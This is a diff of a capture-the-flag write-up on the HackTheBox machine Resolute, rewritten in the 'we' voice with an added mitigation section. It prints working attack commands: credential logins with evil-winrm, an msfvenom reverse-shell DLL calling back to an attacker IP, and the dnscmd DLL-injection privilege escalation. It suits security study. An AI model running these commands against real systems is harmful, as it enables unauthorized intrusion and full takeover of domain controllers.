@@ -28,7 +28,7 @@ This is my guide to the HackTheBox Windows machine _Resolute_.
 
 ## User Flag
 
-First thing’s first. I run my `nmap` scan. _Resolute_ is running a ton of services, all pointing to a potential Active Directory DC. 
+First thing’s first. We'll run my `nmap` scan. _Resolute_ is running a ton of services, all pointing to a potential Active Directory DC. 
 
 - __sC__: Enable common scripts
 
@@ -104,16 +104,16 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Sat May 23 14:54:54 2020 -- 1 IP address (1 host up) scanned in 172.73 seconds
 ```
 
-After the results come back, I also run a full port scan to see if any additional ports may be open. 
+After the results come back, we'll also run a full port scan to see if any additional ports may be open. 
 
 ```bash
 $ sudo nmap -sC -sV -O -p- -oA full169 10.10.10.169
 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 ```
 
-The port that I make note of from the full scan is 5985. This tells me that the box is running `WinRM 2.0 (Microsoft Windows Remote Management)`. Once I find some credentials, I may be able to gain a foothold through this service.
+The port that we'll make note of from the full scan is 5985. This tells us that the box is running `WinRM 2.0 (Microsoft Windows Remote Management)`. Once we find some credentials, we may be able to gain a foothold through this service.
 
-Next, I run `enum4linux`, a tool primarily used to enumerate Windows or Samba systems.
+Next, we'll run `enum4linux`, a tool primarily used to enumerate Windows or Samba systems.
 
 ```bash
 $ enum4linux -U -o 10.10.10.169
@@ -123,7 +123,7 @@ $ enum4linux -U -o 10.10.10.169
 
 It looks like an admin mistakenly left a default password in the description on a user account. Odds are, one of these users may not have changed their default password. 
 
-Using `evil-winrm`, a Windows Remote Management tool for pentesting, I try each username with the password. Eventually, I successfully log in with melanie, attaining a foothold on _Resolute_.
+Using `evil-winrm`, a Windows Remote Management tool for pentesting, we'll try each username with the password. Eventually, we successfully log in with user `melanie`, attaining a foothold on _Resolute_.
 
 ```bash
 $ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
@@ -131,66 +131,66 @@ $ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
 
 ![](images/foothold.png)
 
-Once in, I find the user flag on melanie’s desktop.
+Once in, we find the user flag on melanie’s desktop.
 
 ![](images/user-flag.png)
 
 ## Root Flag
 
-Next, I need to escalate privileges. I start looking around the file system, seeing if anything stands out. I soon find a PowerShell log within the directory `C:\PSTranscripts\20191203` that may contain something of interest.
+Next, we need to escalate privileges. We'll start looking around the file system, seeing if anything stands out. We find a PowerShell log within the directory `C:\PSTranscripts\20191203` that may contain something of interest.
 
 ```powershell
 > type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 ```
 
-Within this transcript is a password for the user ryan. Additionally, the password may imply that ryan has some level of administrative privileges.
+Within this transcript is a password for the user `ryan`. Additionally, the password may imply that `ryan` has some level of administrative privileges.
 
 ![](images/passwd.png)
 
-Using my newly attained credentials, I log in as Ryan using `evil-winrm`. 
+Using our newly attained credentials, we'll log in as `ryan` using `evil-winrm`. 
 
 ```bash
 $ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
 ```
 
-On ryan’s desktop there is a note that indicates that all changes are reverted within a minute. I’ll keep that in mind as I continue.
+On ryan’s desktop there is a note that indicates that all changes are reverted within a minute. we’ll keep that in mind as we continue.
 
 ![](images/note.png)
 
-Next, I want to see if ryan has any unique privileges. I use `net user` and can see that ryan is in the `Contractors` group. This indicates to me that he may have administrator rights. Because _Resolute_ also has DNS enabled, I can assume that ryan is also a DNS Admin or has write privileges to the DNS server object.
+Next, we want to see if `ryan` has any unique privileges. We'll use `net user` and can see that `ryan` is in the `Contractors` group. This indicates to us that the user may have administrator rights. Because _Resolute_ also has DNS enabled, we can assume that `ryan` is also a DNS Admin or has write privileges to the DNS server object.
 
 ```powershell
 > net user ryan /domain
 Global Group memberships     *Domain Users         *Contractors
 ```
 
-[This article](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) has a great write-up on how to abuse a DNS Admin account to escalate privileges. For brevity, I will inject a poisoned DLL into the DNS executable, which will create a SYSTEM-level shell when the DNS process is restarted.
+[This article](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) has a great write-up on how to abuse a DNS Admin account to escalate privileges. For brevity, we will inject a poisoned DLL into the DNS executable, which will create a SYSTEM-level shell when the DNS process is restarted.
 
-Using msfvenom, I will create the malicious DLL payload.
+Using msfvenom, we will create the malicious DLL payload.
 
 ```bash
 $ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.234 LPORT=4444 -f dll > privesc.dll
 ```
 
-I set up a listener as well, in preparation for the reverse shell.
+We'll set up a listener as well, in preparation for the reverse shell.
 
 ```bash
 $ nc -lvnp 4444
 ```
 
-Now I need to get my payload onto the machine. I choose to host the payload on my machine using `smbserver.py` from [impacket](https://github.com/SecureAuthCorp/impacket).
+Now we need to get our payload onto the machine. We'll choose to host the payload on my machine using `smbserver.py` from [impacket](https://github.com/SecureAuthCorp/impacket).
 
 ```bash
 $ sudo python smbserver.py share ./
 ```
 
-On the _Resolute_ box, I run the command to retrieve my poisoned DLL and inject it into `dns.exe`.
+On the _Resolute_ box, we'll run the command to retrieve our poisoned DLL and inject it into `dns.exe`.
 
 ```powershell
 > dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.14.234\share\privesc.dll
 ```
 
-Finally, I restart DNS. This needs to be done relatively quickly to avoid changes being reverted.
+Finally, we'll restart DNS. This needs to be done relatively quickly to avoid changes being reverted.
 
 ```powershell
 > sc.exe stop dns
@@ -199,23 +199,25 @@ Finally, I restart DNS. This needs to be done relatively quickly to avoid change
 
 ![](images/dns-restart.png)
 
-My reverse shell connects and I confirm that I have successfully rooted the box!
+Our reverse shell connects and we confirm that we have successfully rooted the box!
 
 ![](images/root.png)
 
-On the Administrator's desktop I find the final flag.
+On the Administrator's desktop we'll grab the final flag.
 
 ![](images/root-flag.png)
 
 
-***
+*** 
 
-Overall, I really enjoyed this box. Being one of my first Windows machines, I learned a lot about Windows enumeration, and it was beneficial seeing this sort of privilege escalation. I also thought the use of poor password policies and account management was a realistic way to gain unauthorized access. 
+### Mitigation
 
-### Rankings:
+- Enforcing password policies would've prevented a default password from remaining on an active account. Password expirations or requiring a password change on login would've also helped.
 
-__Real-life Applicable__: 8/10
+- Using a password in the command on Powershell or in CLI may be convenient, but a user, especially a user with elevated privileges, should understand the risks associated with logging this information.
 
-__Common Vulnerabilities__: 8/10
+- The article [detailing the DNS privilege escalation](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) also contains some mitigation techniques regarding a user abusing DNS. Primarily, an Administrator should audit those who have write privileges to the DNS object and those that are members of the DNSAdmin group. Additionally, logs can indicate when a user may be abusing this. 
 
-__Enumeration__: 6/10
+### Final Thoughts
+
+Overall, I really enjoyed this box. Being one of my first Windows machines, I learned a lot about Windows enumeration, and it was beneficial seeing this sort of privilege escalation. I also thought the use of poor password policies and account management was a realistic way to gain unauthorized access.
